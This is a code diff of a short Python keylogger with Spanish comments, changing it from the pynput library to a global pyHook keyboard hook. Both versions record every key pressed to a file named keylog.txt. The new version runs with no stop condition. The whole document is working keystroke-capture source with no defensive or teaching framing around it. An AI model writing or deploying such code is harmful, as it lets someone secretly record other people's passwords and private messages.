@@ -1,25 +1,26 @@
-from pynput.keyboard import Listener
+import pyHook
+import pythoncom
 import logging
 
-# Configuración de logging
+# Establecer el nombre del archivo de registro
 file_log = "keylog.txt"  # Puedes cambiar el nombre del archivo aquí
+
+# Configuración de logging
 logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
 
-# Función que maneja el evento de la tecla presionada
-def on_press(key):
-    try:
-        # Registra la tecla presionada
-        logging.log(10, str(key.char))
-    except AttributeError:
-        # Si no es un carácter imprimible (como Shift, Ctrl, etc.)
-        logging.log(10, str(key))
+# Función que maneja el evento del teclado
+def OnKeyboardEvent(event):
+    # Registrando la tecla pulsada en el archivo de log
+    logging.log(10, chr(event.Ascii))
+    return True
 
-# Función para detener el keylogger
-def on_release(key):
-    if key == 'esc':
-        # Detener el listener si se presiona 'esc'
-        return False
+# Crear y configurar el HookManager
+hooks_manager = pyHook.HookManager()
+hooks_manager.KeyDown = OnKeyboardEvent
 
-# Iniciar el listener de teclas
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+# Iniciar el hook del teclado
+hooks_manager.HookKeyboard()
+
+# Mantener el script en ejecución
+pythoncom.PumpMessages()
+
